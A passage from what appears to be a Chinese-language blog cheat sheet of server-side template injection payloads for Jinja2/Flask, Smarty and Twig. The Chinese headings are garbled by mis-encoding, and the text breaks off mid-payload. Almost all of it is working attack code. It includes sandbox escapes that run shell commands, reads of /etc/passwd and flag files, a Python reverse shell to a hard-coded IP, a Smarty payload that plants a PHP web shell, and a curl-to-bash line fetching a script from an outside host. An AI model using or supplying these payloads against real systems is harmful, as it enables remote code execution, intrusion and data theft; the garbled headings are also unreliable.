x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="catch-warnings-è¯»å–æ–‡ä»¶"><a href="#catch-warnings-è¯»å–æ–‡ä»¶" class="headerlink" title="catch_warnings è¯»å–æ–‡ä»¶"></a><code>catch_warnings è¯»å–æ–‡ä»¶</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/app/flag&#x27;, &#x27;r&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="frozen-importlib-external-FileLoader-è¯»å–æ–‡ä»¶"><a href="#frozen-importlib-external-FileLoader-è¯»å–æ–‡ä»¶" class="headerlink" title="_frozen_importlib_external.FileLoader è¯»å–æ–‡ä»¶"></a><code>_frozen_importlib_external.FileLoader è¯»å–æ–‡ä»¶</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"> # </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__bases__[0].__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;FileLoader&#x27; <span class="hljs-keyword">in</span> x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å…¶ä»–RCE"><a href="#å…¶ä»–RCE" class="headerlink" title="å…¶ä»–RCE"></a><code>å…¶ä»–RCE</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;application.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;cycler.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;joiner.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;namespace.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;url_for.__globals__.current_app.add_url_rule(&#x27;/1333337&#x27;,view_func=url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æ€è·¯ä¸€ï¼šå¦‚æœobjectçš„æŸä¸ªæ´¾ç”Ÿç±»ä¸­å­˜åœ¨é™©æ–¹æ³•ï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨"><a href="#æ€è·¯ä¸€ï¼šå¦‚æœobjectçš„æŸä¸ªæ´¾ç”Ÿç±»ä¸­å­˜åœ¨é™©æ–¹æ³•ï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨" class="headerlink" title="æ€è·¯ä¸€ï¼šå¦‚æœobjectçš„æŸä¸ªæ´¾ç”Ÿç±»ä¸­å­˜åœ¨é™©æ–¹æ³•ï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨"></a><code>æ€è·¯ä¸€ï¼šå¦‚æœobjectçš„æŸä¸ªæ´¾ç”Ÿç±»ä¸­å­˜åœ¨é™©æ–¹æ³•ï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__sub</span><br><span class="hljs-template-tag"></span><br><span class="hljs-template-tag">classes__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; <span class="hljs-keyword">in</span> x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-variable">&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;123.3.3.3&quot;,111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-1"><a href="#Python3-1" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">37</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<span class="hljs-comment"># Python2</span><br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;.bash_history&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h1 id="æ€è·¯äºŒï¼šobjectçš„æŸä¸ªæ´¾ç”Ÿç±»å¯¼å…¥äº†ä»–é™©æ¨¡å—ï¼Œå°±å¯ä»¥é“¾å¼è°ƒç”¨å±é™©æ–¹æ³•"><a href="#æ€è·¯äºŒï¼šobjectçš„æŸä¸ªæ´¾ç”Ÿç±»å¯¼å…¥äº†ä»–é™©æ¨¡å—ï¼Œå°±å¯ä»¥é“¾å¼è°ƒç”¨å±é™©æ–¹æ³•" class="headerlink" title="æ€è·¯äºŒï¼šobjectçš„æŸä¸ªæ´¾ç”Ÿç±»å¯¼å…¥äº†ä»–é™©æ¨¡å—ï¼Œå°±å¯ä»¥é“¾å¼è°ƒç”¨å±é™©æ–¹æ³•"></a><code>æ€è·¯äºŒï¼šobjectçš„æŸä¸ªæ´¾ç”Ÿç±»å¯¼å…¥äº†ä»–é™©æ¨¡å—ï¼Œå°±å¯ä»¥é“¾å¼è°ƒç”¨å±é™©æ–¹æ³•</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> sys_module = cls.__init__.__globals__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> sys_module and &#x27;os&#x27; <span class="hljs-keyword">in</span> sys_module.modules %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; sys_module.modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-2"><a href="#Python3-2" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-1"><a href="#Python2-1" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="æ€è·¯ä¸‰"><a href="#æ€è·¯ä¸‰" class="headerlink" title="æ€è·¯ä¸‰"></a><code>æ€è·¯ä¸‰</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> collections_module = cls.__init__.__globals__.get(&#x27;_collections_abc&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> collections_module and collections_module.__dict__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; collections_module.__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Python3-3"><a href="#Python3-3" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">170</span>].__init__.__globals__[<span class="hljs-string">&#x27;_collections_abc&#x27;</span>].__dict__(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-2"><a href="#Python2-2" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>],system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="ç‰¹ä¾‹ï¼š"><a href="#ç‰¹ä¾‹ï¼š" class="headerlink" title="ç‰¹ä¾‹ï¼š"></a><code>ç‰¹ä¾‹ï¼š</code></h1><h1 id="Python3-4"><a href="#Python3-4" class="headerlink" title="Python3"></a><code>Python3</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">134</span>]().__module__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="Python2-3"><a href="#Python2-3" class="headerlink" title="Python2"></a><code>Python2</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>]().__module__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&quot;)</span><br></code></pre></td></tr></table></figure><h1 id="æ€è·¯å››-ï¼šåŸºæœ¬ç±»å‹çš„æŸäº›æ–¹æ³•å±äºç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨"><a href="#æ€è·¯å››-ï¼šåŸºæœ¬ç±»å‹çš„æŸäº›æ–¹æ³•å±äºç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨" class="headerlink" title="æ€è·¯å›› ï¼šåŸºæœ¬ç±»å‹çš„æŸäº›æ–¹æ³•å±äºç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨"></a><code>æ€è·¯å›› ï¼šåŸºæœ¬ç±»å‹çš„æŸäº›æ–¹æ³•å±äºç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨</code></h1><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> cls <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> cls.__init__ is defined and cls.__init__.__globals__ is defined %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> collections_module = cls.__init__.__globals__.get(&#x27;_collections_abc&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> collections_module and collections_module.__dict__.get(&#x27;sys&#x27;, None) %&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; collections_module.__dict__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].system(&#x27;whoami&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].append.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;get_flashed_message(å¯æ›¿æ¢ä»»æ„xxxè¯»æ–‡ä»¶ç»•è¿‡(catç»•è¿‡)).__init__.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">æ‰¾ __builtins__å†æ‰¾__import__-&gt;[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><ul><li><code>__open__-&gt;[&#39;open&#39;](/flag).read()%20</code></li><li>&#96;&#96;.<strong>builtins</strong><a href="%22__import__('os'">â€˜evalâ€™</a>.popen(â€˜cat &#x2F;flagâ€™).read()â€)}}&#96;</li></ul><p><code>==================================================================================================================================================================================================================================</code></p><h1 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a><code>Smarty</code></h1><p><code>//&#123;php&#125;æ ‡ç­¾æ‰§è¡Œphpä»£ç </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;phplecho id ;l/php&#125;<br></code></pre></td></tr></table></figure><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a><code>Getshell</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;<br></code></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><code>RCE</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;system(&#x27;ls&#x27;)&#125;<br>&#123;if show_source (&#x27;/flag&#x27;)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell:"></a><code>åå¼¹shell:</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smarty">&#123;system(&#x27;curl http://d.ylng.vip:12390/dev.txt|bash&#x27;)&#125;<br></code></pre></td></tr></table></figure><h1 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a><code>Twig</code></h1><ul><li><code>ä½¿ç”¨&#123;&#123;_self.env.getFilter&#125;&#125;æŠ¥é”™ï¼Œå¯ä»¥åˆ¤æ–­æ˜¯Twig(æŠ¥é”™åéœ€è¦æ¸…ç©ºæµè§ˆå™¨è®°å½•åœ¨é‡æ–°è®¿é—®ï¼Œtitleä¹Ÿæç¤ºäº†æ˜¯cookie)ã€‚äºæ˜¯æŠ“åŒ…ä¿®æ”¹cookieä¸­çš„userå€¼ï¼Œåˆ©ç”¨ä¸€ä¸‹payloadç›´æ¥æ‰§è¡Œå‘½ä»¤</code><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a><code>RCE</code></h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-variable">&#123;&#123;self&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span 